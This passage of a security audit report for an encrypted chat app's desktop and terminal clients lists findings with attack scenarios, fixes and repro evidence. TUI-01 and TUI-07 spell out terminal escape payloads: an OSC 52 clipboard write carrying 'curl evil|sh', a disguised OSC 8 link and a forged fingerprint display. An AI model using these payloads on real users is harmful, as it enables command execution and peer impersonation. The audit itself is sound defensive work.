The bus log level only filters what LogViewer shows (stores.ts:69-75). SetLogLevel (app.go:1269) saves a string, and ExportLogsToFile (app.go:1220-1257) writes all buffered entries (up to 200) whatever the level. Most DEBUG lines with session IDs and message IDs come from App.addLogEntry (messaging.go:69,167,205,212,224), which writes to the buffer directly and skips slog, so fixing the handler level alone would not filter them. The slog handler is also fixed at LevelDebug (main.go:177). appLogHandler.Handle maps slog INFO (0) to "DEBUG" because `case r.Level >= slog.LevelDebug` comes before the INFO default (loghandler.go:81), so with the default INFO filter the viewer hides library INFO records.

**Recommendation.** Back the handler with a slog.LevelVar that SetLogLevel updates, and filter in appLogHandler.Handle.

#### BUS-46

**Status stays 'Verifying fingerprint of &lt;name&gt;...' after the user rejects a peer on the server side**

Severity: Info · Category: correctness

Locations: `cmd/bus/verifier.go:56-73`, `cmd/bus/verifier.go:118-135`

Both prompting verifiers set StatusVerifying before they wait. On a non-nil verdict (reject) they return right away and skip setStatus(prevStatus, prevMsg). On the dialer side, ConnectToServer's deferred setStatus(StatusError) overwrites it. On the server side nothing does. The status bar keeps showing that a verification is in progress, with a peer-supplied name, until some other event changes the status. Concurrent prompts also restore whichever prevStatus they captured, which can be stale.

**Recommendation.** Restore or reset the status on every exit path of the verifier, with a defer. Do not restore a captured status when other prompts are pending.

#### BUS-47

**macOS Info.plist lacks NSCameraUsageDescription for the QR camera scan**

Severity: Info · Category: build

Locations: `cmd/bus/build/darwin/Info.plist:3`, `cmd/bus/build/darwin/Info.dev.plist:3`, `cmd/bus/frontend/src/lib/ImportDialog.svelte:62`

ImportDialog calls navigator.mediaDevices.getUserMedia for QR scanning. The macOS bundle's Info.plist has no NSCameraUsageDescription key, which macOS requires before granting camera access to an app. The camera scan will fail on macOS (the dialog shows "Camera access denied or unavailable").

**Recommendation.** Add NSCameraUsageDescription to build/darwin/Info.plist and Info.dev.plist, or hide the camera option on macOS.

#### BUS-48

**npm audit reports high-severity devalue <=5.9.2 via the svelte devDependency; not reachable in the shipped client bundle**

Severity: Info · Category: build

Locations: `cmd/bus/frontend/package.json:21-30`, `cmd/bus/frontend/package-lock.json:1`

npm audit on the locked tree reports devalue 5.9.0, pulled in by svelte 5.56.9, with GHSA-9rgm-9g3h-6x36, GHSA-j22f-vq7h-c4qm, GHSA-hx4r-w6wj-j8fg, GHSA-mcm9-63f2-9j32, GHSA-wf3x-273g-mvxv, GHSA-x5rw-q4pp-hg5g and GHSA-4q55-j62x-fr9h. In svelte, devalue is imported only from svelte/src/internal/server (renderer.js, hydratable.js, errors.js) for SSR serialization. The bus is a client-only SPA embedded in Wails, so the vulnerable functions do not run. `npm audit --omit=dev` reports 0 vulnerabilities. Runtime dependencies (@wailsio/runtime 3.0.0-beta.23, jsqr 1.4.0, qrcode 1.5.4) had no advisories. npm outdated shows @wailsio/runtime 3.0.0-beta.23 (latest beta.27), svelte 5.56.9 (5.57.1) and vite 8.2.1 (8.3.2).

**Recommendation.** Run `npm audit fix` or bump svelte to 5.57.x so devalue resolves above 5.9.2, keep @wailsio/runtime in lockstep with the Go Wails version, and add npm audit to CI.

#### BUS-49

**No tests cover verifiers, incognito persistence, ConnectToServer or serverHandler, or mode validation**

Severity: Info · Category: test-gap

Locations: `cmd/bus/app_test.go:74`, `cmd/bus/app_test.go:126`, `cmd/bus/verifier.go:13-26`, `cmd/bus/peers_test.go`, `cmd/bus/relay_test.go`, `cmd/bus/p2p_test.go`

The bus tests cover peer CRUD, token parsing, multiListener, tokenTracker and broker helpers. TestMessageInfoStruct and TestConcurrentSliceAccess only check local struct literals or slices. No test exercises getVerifier, createStrictVerifier, createQuickVerifier, createAutoAcceptVerifier, awaitVerification or VerifyResponse. No test checks that incognito leaves no session in the DB, covers ConnectToServer, serverHandler, receiveMessages or reconnectSession, or checks SetVerificationMode input. getVerifier sends any unknown mode to Auto-Accept (verifier.go:24-25), and no test covers that. The default Linux build needs the GTK4 and WebKitGTK 6 dev packages. 'CGO_ENABLED=0 go test -tags server ./...' builds and passes without them, so CI can run these tests.

**Recommendation.** Add table-driven tests for each verifier against a real storage.Storage. Add an incognito end-to-end test over net.Pipe or a loopback listener that asserts ListSessions is empty. Add a build tag or interface seam so App logic compiles without the Wails GUI.

### tui

cmd/tui: the Bubble Tea terminal client.

| ID                | Severity | Category    | Finding                                                                                                                                             |
| ----------------- | -------- | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| [TUI-01](#tui-01) | Medium   | security    | Peer chat text and history are written to the terminal raw: OSC 52 clipboard write, OSC 8 links, title change, forged lines                         |
| [TUI-02](#tui-02) | Medium   | dos         | TUI verifier blocks forever when a verify request arrives outside stateConnecting, leaking a goroutine and socket per connection                    |
| [TUI-03](#tui-03) | Medium   | correctness | Connect via Relay cannot be used: Tab focuses the token field without blurring the address field, so the token is also typed into the relay address |
| [TUI-04](#tui-04) | Medium   | correctness | Server mode leaves spare connection readers, so a resumed session silently replaces the live chat and the user's messages go to a different peer    |
| [TUI-05](#tui-05) | Medium   | concurrency | Data races between background goroutines and model fields; Esc during relay setup leaks a live relay server                                         |
| [TUI-06](#tui-06) | Medium   | concurrency | Esc or Ctrl+C in a direct-dial or relay-dial chat deadlocks the UI; the transport is never closed                                                   |
| [TUI-07](#tui-07) | Medium   | ux-safety   | Unauthenticated Introduce Name is rendered raw on the verify screen and can print a forged fingerprint block                                        |
| [TUI-08](#tui-08) | Low      | security    | Relay modes always use plain ws:// with no TLS, WSS or PSK option                                                                                   |
| [TUI-09](#tui-09) | Low      | dos         | Authenticated peer can stall the UI: unbounded transcript, full re-render and a BoltDB write per message on the event loop                          |
| [TUI-10](#tui-10) | Low      | dos         | Network writes run on the Bubble Tea event loop and relay writes have no deadline, so a stalled relay or peer freezes the TUI, including Ctrl+C     |
| [TUI-11](#tui-11) | Low      | correctness | Cancelled connection attempts keep running, and their late results are applied to the next attempt                                                  |
| [TUI-12](#tui-12) | Low      | correctness | chatMessageMsg is processed after cleanup and dereferences a nil transport, crashing the TUI                                                        |
| [TUI-13](#tui-13) | Low      | correctness | Passphrase prompt reads from fd 0, which fails on Windows                                                                                           |
| [TUI-14](#tui-14) | Low      | correctness | Server listen errors are discarded; the UI shows 'Listening on' forever after a bind failure                                                        |
| [TUI-15](#tui-15) | Low      | correctness | TUI renders and stores SessionData frames as chat messages; bus sends one on every session                                                          |
| [TUI-16](#tui-16) | Low      | ux-safety   | Default slog handler writes to stderr over the Bubble Tea screen; unauthenticated connections can trigger it                                        |
| [TUI-17](#tui-17) | Low      | ux-safety   | Empty passphrase is accepted silently and new databases are created without confirmation                                                            |
| [TUI-18](#tui-18) | Low      | ux-safety   | Verify prompt accepts on Enter; the advertised [Esc] Back key does nothing                                                                          |
| [TUI-19](#tui-19) | Low      | spec-drift  | Server-mode exit closes the socket before RouteCloseTransport; resumption tokens survive explicit close                                             |
| [TUI-20](#tui-20) | Info     | correctness | Session countdown is shown only in relay-serve mode and starts at chat entry, not at relay registration                                             |
| [TUI-21](#tui-21) | Info     | correctness | TUI minor-version warning cannot fire for 0.x because core rejects pre-1.0 minor mismatches                                                         |
| [TUI-22](#tui-22) | Info     | test-gap    | Several TUI tests re-implement the logic under test instead of calling it                                                                           |

Findings filed elsewhere that also apply here: [KAM-07](#kam-07), [KAM-08](#kam-08), [STO-02](#sto-02).

#### TUI-01

**Peer chat text and history are written to the terminal raw: OSC 52 clipboard write, OSC 8 links, title change, forged lines**

Severity: Medium · Category: security

Locations: `cmd/tui/tea.go:559`, `cmd/tui/tea.go:621-623`, `cmd/tui/tea.go:308-309`, `cmd/tui/tea.go:517-518`, `cmd/tui/history.go:131-136`, `cmd/tui/tea.go:248`

The receive loop converts the decrypted payload straight to a string (tea.go:559) and handleChatMessage appends it to the transcript through lipgloss styles (tea.go:623). lipgloss and the viewport keep escape sequences intact, and the Bubble Tea v1.3.10 standard renderer only truncates lines (standard_renderer.go:241 ansi.Truncate) before writing them to the TTY. No code in cmd/tui strips C0/C1 control bytes, ESC, CR or newlines. The same bytes are stored by AddChatEntry and replayed unfiltered when the session is restored (tea.go:518) and in the history browser (history.go:131-136, joined at tea.go:248), so one hostile message fires again every time history is opened. Inbound messages are not held to the 280-character send limit; the only bound is the 65535-byte frame.

**Attack scenario.** An accepted peer sends a chat message such as `hi\x1b]52;c;<base64 of 'curl evil|sh\n'>\x07`. Terminals with OSC 52 write enabled (xterm with allowWindowOps, kitty, WezTerm, Alacritty, Windows Terminal, tmux set-clipboard on) replace the user's clipboard, and the next paste into a shell runs the attacker's command. `\x1b]0;...\x07` retitles the window. `\x1b]8;;https://evil\x07click\x1b]8;;\x07` shows link text that opens a different URL. A message containing `\n` plus SGR colour codes renders a line `[2026-10-03 22:00:00] You: I agree` in the local user's colours, which forges messages from the user in their own transcript.

**Recommendation.** Add a sanitizer for every peer- or DB-sourced string before it reaches a style or viewport: drop ESC (0x1b) and ESC-initiated sequences (for example ansi.Strip), C0 controls except a handled newline, DEL, C1 (0x80-0x9f) and bidi override code points, and replace CR. Render each received line under a fixed prefix so embedded newlines cannot start a fresh prefixed line (for example, indent continuation lines). Apply it in handleChatMessage, loadChatHistory, loadSessionMessages and the error renderers.

<details><summary>Evidence</summary>

```text
tea.go:559 `text := string(b.GetValue())`
tea.go:623 `m.messages = append(m.messages, prefix+m.s.peerText.Render(msg.text))`
tea.go:518 `msg := prefix + ts.Render(string(ent.Data))`
history.go:131-135 `fmt.Sprintf("[%s] %s: %s", ..., string(ent.Data))`
Repro in sandbox (tea.Program with WithOutput buffer, chatMessageMsg containing OSC 52/0/8): `OSC52 present: true`, `OSC0 present: true`, `OSC8 present: true`
Repro (lipgloss v1.1.0 + bubbles viewport): payload `hi\n\x1b[38;2;74;144;226m[2026-10-03 10:00:00] You: \x1b[0maccepted\x1b]52;c;aGVsbG8=\x07\x1b]0;pwned\x07` appears unchanged in [...]
```

</details>

#### TUI-02

**TUI verifier blocks forever when a verify request arrives outside stateConnecting, leaking a goroutine and socket per connection**

Severity: Medium · Category: dos

Locations: `cmd/tui/tea.go:200-206`, `cmd/tui/tea.go:312-337`, `cmd/tui/tea.go:358-368`, `cmd/tui/tea.go:420-422`, `cmd/tui/server.go:10-29`, `server.go:93-108` and 2 more

In "Start Server (TCP)" mode the kamune.Server keeps accepting after the chat starts, because enterChat does not close m.srv. Any unauthenticated client that completes HPKE and sends a self-signed Introduce reaches the TUI verifier, which sends a verifyRequest and blocks on `err := <-respCh` with no timeout. Update ignores the request when state is not stateConnecting, so nothing answers. serve() never returns, the deferred cn.Close never runs, and the goroutine and socket leak until the process exits. The same happens for extra connections while the verify screen is open. Each attempt costs the attacker one HPKE encapsulation and one Ed25519 signature, so memory and fds grow without bound. Go raises the soft fd limit to the hard limit at startup, so exhaustion takes many connections. Relay serve mode is not exposed in the same way, because the relay listener serves one token-gated connection at a time.

**Attack scenario.** While the victim chats in 'Start Server (TCP)' or 'Start Relay Server' mode, an unauthenticated client loops: TCP connect, HPKE exchange, send a self-signed Introduce, keep the socket open or drop it. Every attempt permanently pins a goroutine and a file descriptor. At the default 1024-fd limit, Accept fails with EMFILE and ListenAndServe retries with no backoff (server.go:101-102), spinning a core and printing slog errors over the TUI. BoltDB and other file operations then fail. A legitimate peer that connects while an attacker prompt is open is also stuck.

**Recommendation.** Make the verifier select on respCh, a timer shorter than the handshake deadline, and a model-owned context, and return ErrVerificationFailed on timeout. In Update, answer any verifyRequest that is not displayed with an error instead of dropping it. Allow only one verification in flight and reject others. Close or stop accepting on m.srv once a chat starts in single-peer modes. Add accept backoff in core ListenAndServe.

<details><summary>Evidence</summary>

```text
tea.go:200-203 `case verifyRequest: if m.state != stateConnecting { return m, nil }`
tea.go:322-329 `m.program.Send(verifyRequest{... responseCh: respCh}); err := <-respCh`
server.go:203 `if err := s.handshakeOpts.remoteVerifier(s.storage, peer); err != nil {`
server.go:101-102 `slog.Error("accept conn", ...); continue`
Sandbox repro: state=stateChat, call mkVerifier()(store, peer): `verifier goroutine still blocked after 3s (leaked)`
Sandbox repro (cmd/tui/zz_hang_test.go, state=stateWelcome): `CONFIRMED: verifier still blocked after 3s while state=stateWelcome (program alive)`
```

</details>

#### TUI-03

**Connect via Relay cannot be used: Tab focuses the token field without blurring the address field, so the token is also typed into the relay address**

Severity: Medium · Category: correctness

Locations: `cmd/tui/welcome.go:123-128`, `cmd/tui/welcome.go:136-152`, `cmd/tui/welcome.go:154-160`, `cmd/tui/welcome.go:50-54`

updateInput handles Tab with `m.inputs[nextInput(m.inputs)].Focus()` and never calls Blur on the current input. updateInputs then passes every key to every input, and bubbles textinput accepts input whenever it is focused (bubbles v1.0.0 textinput.go:556 `if !m.focus`). After one Tab both fields are focused, and every rune typed or pasted goes into both. There is no way to unfocus the address field. nextInput and prevInput return an index based on the first focused input, which is always 0. Relay dial needs a token in the second field, so the address always gets the token appended. The dial then fails with a bad host:port. A sandbox test that calls selectMode(2), sends KeyTab, then sends runes "abcd" produced `addr="localhost:9001abcd" token="abcd" f0=true f1=true`.

**Attack scenario.** No attacker needed. A user picks Connect via Relay, presses Tab as the on-screen help says (`[Tab] next field`), and pastes the token. relayDial gets an address such as `localhost:9001<hex token>`, and websocket.Dial to `ws://localhost:9001<hex>/ws` fails. The relay dial menu option never connects with the default flow.

**Recommendation.** Blur all inputs before focusing the next one in the Tab and Shift+Tab handlers. Add a test that types into the second field and checks that the first field is unchanged.

<details><summary>Evidence</summary>

```text
welcome.go:123-128 `case tea.KeyTab: m.inputs[nextInput(m.inputs)].Focus(); return m, nil` with no Blur; welcome.go:156-158 `for i := range m.inputs { m.inputs[i], cmd = m.inputs[i].Update(msg) }`; repro in a private copy (cmd/tui/zz_repro_test.go) logged `addr="localhost:9001abcd" token="abcd" f0=true f1=true`.
```

</details>

#### TUI-04

**Server mode leaves spare connection readers, so a resumed session silently replaces the live chat and the user's messages go to a different peer**

Severity: Medium · Category: correctness

Locations: `cmd/tui/tea.go:368`, `cmd/tui/welcome.go:242`, `cmd/tui/welcome.go:253`, `cmd/tui/tea.go:186-191`, `cmd/tui/tea.go:529`, `cmd/tui/tea.go:581` and 3 more

In modeDirectServe, startConnect returns a waitConn command on connCh (tea.go:368). Each verify answer, accept or reject, returns another waitConn on the same channel (welcome.go:242, welcome.go:253). After one accepted peer, two goroutines wait on connCh and only one is consumed. The other stays blocked until connCtx is cancelled, and that only happens on cleanup. The connectedMsg case in Update has no state guard: `case connectedMsg: m.transport = msg.transport ... return m.enterChat()` (tea.go:186-191). The core server has resumption on by default. handleResume calls the handler with no RemoteVerifier (server.go:315). So when any peer with a valid resumption token for an earlier session reconnects during a chat, the TUI handler pushes it into connCh, the spare reader delivers connectedMsg, and enterChat replaces m.transport with no prompt. The receive and keepalive goroutines read the m.transport field on every loop (`m.transport.Receive(b)` at tea.go:529, `tuiSendPing(m.transport, m.pongCh, ...)` at tea.go:581). After the swap, the old and new goroutines both read the new transport, and the old transport is no longer read. Two concurrent readers can check sequence numbers out of order and close the session with ErrOutOfSync. The two keepalive loops share one pongCh and consume each other's pongs. The previous conversation stays on screen (historyLoadedMsg prepends the new session's history to m.messages). Text typed after that goes to the resuming peer. A separate defect in the same path: the handler does `connCh <- t` before `<-doneCh` (cmd/tui/server.go:15-16). When the 1-slot buffer is full and no reader is left, the send never selects on doneCh, so that goroutine and its socket stay blocked after cleanup for the life of the process.

**Attack scenario.** The TUI user runs Start Server and accepts peer A. Peer B chatted with this TUI earlier the same day. B's session ended without RouteCloseTransport, which happens on server-mode exit (known issue), so B still holds resumption tokens. bus redials with DialWithResume on an involuntary disconnect (cmd/bus/network.go:700-701), or a modified client can resume on purpose. B connects and resumes. The spare waitConn returns B's transport, and the TUI switches to B's session while A's messages are still on screen. The user's next messages, written for A, are encrypted to B. A's connection is left open and unread.

**Recommendation.** Track the pending wait as a single command per attempt. Do not issue a new waitConn from updateVerify while one is outstanding. Ignore connectedMsg unless state is stateConnecting and the message carries the current attempt ID. In server mode, close any extra transport delivered while in chat, or offer it as a new prompt. Make the receive and keepalive goroutines capture the transport and pong channel as locals. In serve(), use select on `connCh <- t` and `<-doneCh`.

<details><summary>Evidence</summary>

```text
tea.go:368 `return waitConn(m.connCtx, connCh, true)`; welcome.go:240-242 `if m.srv != nil { m.state = stateConnecting; return m, waitConn(m.connCtx, m.connCh, true) }`; tea.go:186-191 `case connectedMsg: m.transport = msg.transport ... return m.enterChat()`; tea.go:529 `metadata, err := m.transport.Receive(b)` inside the loop; cmd/tui/server.go:14-17 `handler := func(t *kamune.Transport) error { connCh <- t; <-doneCh; return nil }`; server.go:173-180 routes RouteResumeRequest to handleResume when resumeEnabled (default true at server.go:353); server.go:315 `if err := s.handlerFunc(t); err != [...]
```

</details>

#### TUI-05

**Data races between background goroutines and model fields; Esc during relay setup leaks a live relay server**

Severity: Medium · Category: concurrency

Locations: `cmd/tui/tea.go:353`, `cmd/tui/tea.go:380`, `cmd/tui/tea.go:397`, `cmd/tui/tea.go:529`, `cmd/tui/tea.go:549`, `cmd/tui/tea.go:578` and 7 more

Background goroutines read and write model fields without synchronization. keepAliveLoop reads m.doneCh at tea.go:578 and the receive loop reads m.transport at tea.go:529 and 549, while cleanup writes them at tea.go:665 and 673. In direct-dial and relay-dial modes startConnect never sets m.doneCh. keepAliveLoop then selects on a nil channel, and cleanup (tea.go:668) blocks forever on <-m.keepAliveDone, so Esc in a dial-mode chat hangs the Bubble Tea event loop. In relay-serve mode, ListenRelay runs on context.Background (relayserver.go:16). If Esc comes first, cancelConnect sees m.srv == nil. The goroutine then sets m.srv (tea.go:397), and relayReadyMsg sets m.relayToken in any state (tea.go:212-214). The stale token then shows on the next relay-serve connecting screen. A later relay-serve overwrites m.srv without closing the old server.

**Attack scenario.** Trigger: the user starts 'Start Relay Server' and presses Esc while registration is in progress, then starts a direct dial. The leaked relay server stays registered on the relay; a peer that joins with the shown token reaches a verifier that never answers. With -race, Esc in a direct-serve chat reports races on m.doneCh and m.transport. If the receive goroutine re-reads a nil m.transport after ErrReceiveTimeout, it panics.

**Recommendation.** Return results from goroutines only through messages (for example, a relayReadyMsg that carries srv) and assign fields only inside Update. Pass the transport, pong channel and stop channel to the goroutines as arguments instead of reading model fields. Use m.connCtx for ListenRelay and DialRelay so Esc cancels them, and close any srv that arrives after the context is cancelled.

<details><summary>Evidence</summary>

```text
tea.go:396-398 `m.srv = srv` / `m.program.Send(relayReadyMsg{...})` (inside go func)
tea.go:529 `metadata, err := m.transport.Receive(b)` (goroutine)
relayserver.go:16 `ctx := context.Background()`
`go test -race` with Esc in a direct-serve chat: `WARNING: DATA RACE Write ... tea.go:665 ... Previous read ... tea.go:578` and `WARNING: DATA RACE Write ... tea.go:673 ... Previous read ... tea.go:529`
```

</details>

#### TUI-06

**Esc or Ctrl+C in a direct-dial or relay-dial chat deadlocks the UI; the transport is never closed**

Severity: Medium · Category: concurrency

Locations: `cmd/tui/tea.go:345-383`, `cmd/tui/tea.go:571-593`, `cmd/tui/tea.go:658-674`, `cmd/tui/chat.go:38-43`, `cmd/tui/tea.go:266-269`

keepAliveLoop exits only when m.doneCh is closed or after 3 ping failures (tea.go:576-585). m.doneCh is created only in the two serve modes (tea.go:360, 387). The dial modes leave it nil, so `<-m.doneCh` blocks forever. cleanup(), which runs on the Bubble Tea event loop for Esc (chat.go:39) and Ctrl+C (tea.go:268), closes doneCh only when non-nil and then waits on `<-m.keepAliveDone` (tea.go:668) before it closes the transport (tea.go:671). While the transport is open, pings succeed and the loop keeps running. If pings fail, the loop calls m.program.Send (tea.go:584), which blocks because the event loop is stuck inside cleanup. The result is a permanent deadlock. Ctrl+C is a key event in raw mode and goes through the same path, so the user must kill the process and the terminal stays in raw mode. Because transport.Close never runs, RouteCloseTransport is never sent and the resumption tokens are not invalidated. keepAliveLoop also reads m.doneCh while cleanup writes it with no synchronization.

**Attack scenario.** Trigger: ordinary use by the local user. They connect with 'Direct Connect (TCP)' or 'Connect via Relay', chat, then press Esc (documented in cmd/tui/README.md) or Ctrl+C. The TUI freezes and the session stays open until the process is killed from another terminal.

**Recommendation.** Give keepAliveLoop its own stop channel (or per-session context) created in enterChat for every mode, passed as an argument, and closed in cleanup. Close the transport before waiting for the goroutine, or do not wait on the event loop at all. Use a non-blocking or context-aware wrapper for program.Send from background goroutines.

<details><summary>Evidence</summary>

```text
tea.go:577-578 `select { case <-m.doneCh: return`
tea.go:663-674 `if m.doneCh != nil { close(m.doneCh) ...}` then `if m.keepAliveDone != nil { <-m.keepAliveDone ...}` then `if m.transport != nil { m.transport.Close() ...}`
Sandbox repro (real kamune server + dial(), connectedMsg, then KeyEsc): `event loop BLOCKED 5s after Esc in direct-dial chat`
Sandbox repro (keepAliveLoop with nil doneCh, then cleanup()): `CONFIRMED: cleanup() blocked >3s waiting on keepAliveDone (doneCh nil in dial mode)`
```

</details>

#### TUI-07

**Unauthenticated Introduce Name is rendered raw on the verify screen and can print a forged fingerprint block**

Severity: Medium · Category: ux-safety

Locations: `cmd/tui/welcome.go:274`, `cmd/tui/welcome.go:278`, `cmd/tui/welcome.go:280`, `intro.go:88`, `cmd/tui/tea.go:312`

The TUI verify screen prints the remote-supplied Introduce Name with no sanitization or length cap (welcome.go:278). It does so before the real emoji and hex fingerprints and the known/unknown status line. Newlines and ESC sequences in Name pass through lipgloss and Bubble Tea to the terminal. A peer can therefore draw a forged fingerprint block or a forged "This peer has connected before." line above the genuine ones, and can emit OSC sequences (title, OSC 52 clipboard) before the user accepts. The genuine block still renders below.

**Attack scenario.** An attacker, or an on-path party that terminates the unauthenticated HPKE exchange, connects with its own key and sets Name to `Alice\n\nEmoji fingerprint:\n  <Alice's real emoji>\n\nHex fingerprint:\n  <Alice's real hex>\n\n✓ This peer has connected before.` plus SGR codes that copy the real styling. The screen shows Alice's expected fingerprint under the normal headings at the top. The attacker's real fingerprint follows lower down, with a 'not known' warning that appears on every first contact anyway. A user who compares the first block accepts the impostor. Name can also carry OSC 52 (for example `Bob\n\x1b]52;c;<base64 of 'curl evil|sh'>\x07`), title and hyperlink sequences, which fire before the user has accepted anything.

**Recommendation.** Sanitize Name (strip controls and ESC, collapse newlines) and cap its length (for example 64 runes) before display. Render it on one line with a label such as 'Claimed name (unverified)'. Show the fingerprint before any peer-supplied text. For known keys, show the locally stored name next to the claimed one. Consider bounding Name in core receiveIntroduction too.

<details><summary>Evidence</summary>

```text
welcome.go:274-281 `name := req.peer.Name` / `b.WriteString("Connection from: " + m.s.bold.Render(name))` / `b.WriteString("\n\nEmoji fingerprint:\n  " + req.emojiFP)`
intro.go:87-88 `peer := &storage.Peer{ Name: introduce.GetName(), ...`
Sandbox repro: viewVerify with Name containing `\x1b]0;x\x07\n\nHex fingerprint:\n  FAKE` gives `name escape present: true`, `fake fp line count: 2`.
```

</details>

#### TUI-08

**Relay modes always use plain ws:// with no TLS, WSS or PSK option**

Severity: Low · Category: security

Locations: `cmd/tui/tea.go:374`, `cmd/tui/tea.go:392`, `cmd/tui/relayclient.go:29`, `cmd/tui/relayserver.go:22`, `pkg/relayconn/dial.go:22`, `pkg/relayconn/listener.go:50`

The TUI passes an empty password to relayDial and relayServe (tea.go:374, 392) and calls DialRelay and ListenRelay, which hard-code `ws://%s/ws`. There is no input for a PSK, WSS or TLS. The relay hop runs over cleartext WebSocket, protected only by the unauthenticated relay HPKE. The TUI also cannot use PSK-protected relays or the WSS/CDN deployments described in RELAY.md for censored networks.

**Attack scenario.** An active on-path attacker between the TUI and the relay terminates the unauthenticated relay HPKE and reads the Register token, then joins or burns the session first. A passive observer sees a cleartext WebSocket upgrade to /ws with the relay Host header, which is easy to fingerprint and block.

**Recommendation.** Accept a scheme in the relay address (ws, wss, tcp, tls) as the daemon and bus do, add a password field, and default to wss with certificate verification.

#### TUI-09

**Authenticated peer can stall the UI: unbounded transcript, full re-render and a BoltDB write per message on the event loop**

Severity: Low · Category: dos

Locations: `cmd/tui/tea.go:621`, `cmd/tui/tea.go:624`, `cmd/tui/tea.go:627`, `cmd/tui/tea.go:308`, `cmd/tui/chat.go:49`

Each received message is appended to m.messages with no cap. renderChatContent joins and word-wraps the whole transcript on every message (tea.go:308-310, 624), so total work grows as O(n^2). AddChatEntry runs a BoltDB write transaction (fsync) on the Bubble Tea goroutine for every inbound message (tea.go:627). Inbound messages are not held to the 280-character send limit and can be up to the ~64 KiB frame size. transport.Send in chat.go:49 also runs on the event loop with the 1-minute write deadline.

**Attack scenario.** An accepted peer sends thousands of 60 KiB messages. Every one triggers an fsync and a re-wrap of the growing transcript, so the TUI stops responding to keys and memory grows without limit.

**Recommendation.** Cap the in-memory transcript (ring buffer) and append incrementally to the viewport content. Move DB writes off the event loop or batch them. Truncate or reject inbound messages above a display limit.

#### TUI-10

**Network writes run on the Bubble Tea event loop and relay writes have no deadline, so a stalled relay or peer freezes the TUI, including Ctrl+C**

Severity: Low · Category: dos

Locations: `cmd/tui/chat.go:49-51`, `cmd/tui/tea.go:671-673`, `cmd/tui/tea.go:266-269`, `dial.go:72-73`, `server.go:217`, `pkg/relayconn/conn.go:96-104` and 2 more

updateChat calls m.transport.Send on Enter (chat.go:49-51), and cleanup calls m.transport.Close, which also sends a frame (tea.go:672, transport.go:178). Both run inside Update. While Update is blocked, Bubble Tea processes no other message. Ctrl+C, SIGINT (sent as InterruptMsg through p.msgs) and SIGTERM go through the same loop. On relay connections, the handshake deadline is cleared after setup (dial.go:73, server.go:217). RelayConn.WriteBytes writes through wsAdapter with the zero deadline, so it calls `w.conn.Write(ctx, ...)` using the background context with no timeout (relayconn/transport.go:78-88). The TUI relay path uses context.Background() (cmd/tui/relayclient.go:20, cmd/tui/relayserver.go:16). A relay that stops reading blocks the write until the TCP connection dies. On direct TCP, each write blocks for up to the 1-minute default write deadline (conn.go:302). The receive goroutine's automatic pong reply (tea.go:549) holds sendMu while it blocks, which adds to the wait. The docs accept relay DoS, but here the client cannot quit and the user has to kill the process.

**Attack scenario.** A malicious relay (A3) forwards frames to the TUI but stops reading from it after the session starts. When the TUI user presses Enter, the WebSocket write fills the socket buffer and blocks with no deadline. The TUI stops redrawing and ignores Esc and Ctrl+C. On direct TCP, a peer that stops reading freezes the UI for 60 s on each send.

**Recommendation.** Send in a tea.Cmd or a dedicated writer goroutine and report the result as a message. Set a per-write deadline on established relay connections, or make WriteBytes use a bounded context. Make the Ctrl+C path quit without waiting for Close to finish.

#### TUI-11

**Cancelled connection attempts keep running, and their late results are applied to the next attempt**

Severity: Low · Category: correctness

Locations: `cmd/tui/tea.go:342`, `cmd/tui/tea.go:346-355`, `cmd/tui/tea.go:373-382`, `cmd/tui/tea.go:192-206`, `cmd/tui/tea.go:212-215`, `cmd/tui/welcome.go:195-197` and 2 more

startConnect creates connCtx (tea.go:342), but only waitConn uses it. dial() takes no context (client.go:10-15), and the dial goroutines (tea.go:346-355, 373-382) cannot be stopped. Esc in stateConnecting only calls cancelConnect and returns to the menu (welcome.go:195-197). A direct dial can run for up to 10 s of TCP connect plus 30 s of handshake (dial.go:207-210). Its messages carry no attempt ID. Update applies connectFailedMsg and verifyRequest whenever state is stateConnecting, and connectedMsg and relayReadyMsg in any state. A stale connectFailedMsg therefore runs cancelConnect on the new attempt, which closes the new server's listener (tea.go:647-649) and shows the old error. A stale verifyRequest is shown as the prompt for the new attempt. If the user accepts it, the old dial completes and connectedMsg moves the UI into chat with the cancelled target. A stale relayReadyMsg can overwrite the displayed relay token with one from a cancelled relay-serve attempt. This differs from the known verifier-blocking and relay-server-leak issues: those cover goroutines that never finish, and this covers results that finish and land in the wrong attempt.

**Attack scenario.** The user dials an unreachable address, presses Esc after 2 s, and picks Start Server. About 8 s later the old net.DialTimeout fails. connectFailedMsg arrives while state is stateConnecting, so the TUI closes the new listener and shows the old dial error. In another order, the user cancels a dial to host X and starts listening for Y. X answers, and the prompt shows X's introduction where the user expects Y.

**Recommendation.** Give each attempt an ID or its own context, include it in every message the attempt sends, and drop messages whose ID is not current. Pass connCtx into dial, relayDial and relayServe (for example through a dial function that uses relayconn.DialRelay(ctx, ...) and net.Dialer.DialContext) so Esc stops the work.

#### TUI-12

**chatMessageMsg is processed after cleanup and dereferences a nil transport, crashing the TUI**

Severity: Low · Category: correctness

Locations: `cmd/tui/tea.go:216-217`, `cmd/tui/tea.go:626-628`, `cmd/tui/tea.go:673`, `cmd/tui/tea.go:560`

Update dispatches chatMessageMsg in every state (tea.go:216-217). handleChatMessage calls m.transport.SessionID() whenever m.store != nil (tea.go:626-628), and main.go:368 always sets the store. In direct-serve or relay-serve chat, a message that the receive goroutine is blocked sending (tea.go:560) when the user presses Esc is delivered right after cleanup sets m.transport = nil (tea.go:673). This causes a nil pointer panic, and Bubble Tea recovers it by exiting the program. The claim that a message can be persisted under a later session is not reachable in practice.

**Attack scenario.** A connected peer floods chat messages. The local user presses Esc in serve mode. A message queued while cleanup ran is delivered after it and the client exits with a panic trace. A message could also be persisted under a later session's ID if a new chat has started by then.

**Recommendation.** Ignore chatMessageMsg unless state is stateChat, and tag each message with the session ID or transport pointer it came from, dropping any that do not match the current m.transport.

#### TUI-13

**Passphrase prompt reads from fd 0, which fails on Windows**

Severity: Low · Category: correctness

Locations: `cmd/tui/main.go:46`

main calls `term.ReadPassword(0)`. On Windows, golang.org/x/term converts the fd to `windows.Handle(fd)` and calls GetConsoleMode (term_windows.go:27). Handle 0 is not the console input handle, so the call fails. The TUI then exits with "reading passphrase". Without KAMUNE_DB_PASSPHRASE the TUI cannot start on Windows. The env-variable workaround leaves the passphrase in the process environment. Bubble Tea and the rest of the code are cross-platform, and the bus targets Windows.

**Attack scenario.** No attacker needed. A Windows user runs the TUI without KAMUNE_DB_PASSPHRASE, and it exits at the passphrase prompt. The only way to start it is to put the passphrase in an environment variable.

